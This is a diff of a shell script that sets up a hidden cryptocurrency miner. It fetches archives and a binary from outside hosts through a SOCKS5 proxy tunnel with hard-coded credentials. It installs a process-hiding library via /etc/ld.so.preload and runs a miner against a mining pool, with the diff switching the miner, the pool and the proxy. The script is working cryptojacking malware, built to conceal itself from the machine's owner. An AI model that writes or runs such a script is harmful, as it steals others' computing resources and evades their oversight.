@@ -2,7 +2,7 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime 
 dpkg-reconfigure --frontend noninteractive tzdata 
  
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl 
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl libssl-dev libcurl4-gnutls-dev libgmp-dev ocl-icd-opencl-dev
  
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz 
  
@@ -11,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END 
 listen = :2233 
 loglevel = 1 
-socks5 = 154.13.90.91:80 
-socks5_username = nofvbdys-rotate 
-socks5_password = 44tpywm4q9bo 
+socks5 = 185.242.111.64:12324
+socks5_username = 14abf5d6e18da 
+socks5_password = dbb7a6d2ae 
 END 
  
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf & 
@@ -35,8 +35,8 @@ echo "**"
 echo " " 
 echo " " 
  
-./graftcp/graftcp wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz 
-tar xf hellminer_cpu_linux.tar.gz   
+./graftcp/graftcp wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu
+chmod +x ac-gpu 
  
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
 unzip magicBezzHash.zip 
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/ 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
  
-./graftcp/graftcp ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RFAyGt31VDBd2MK4wWQoRsFzUXi755Ubn6.PayAs -p x --cpu $(nproc)
+./graftcp/graftcp ./ac-gpu -F http://pool.aquachain.xyz:8888/0xa1Ab79adE8B4d41d7C898A44521D567F59E8f082/tes -t 0 --proxy socks5://14abf5d6e18da:dbb7a6d2ae@185.242.111.64:12324
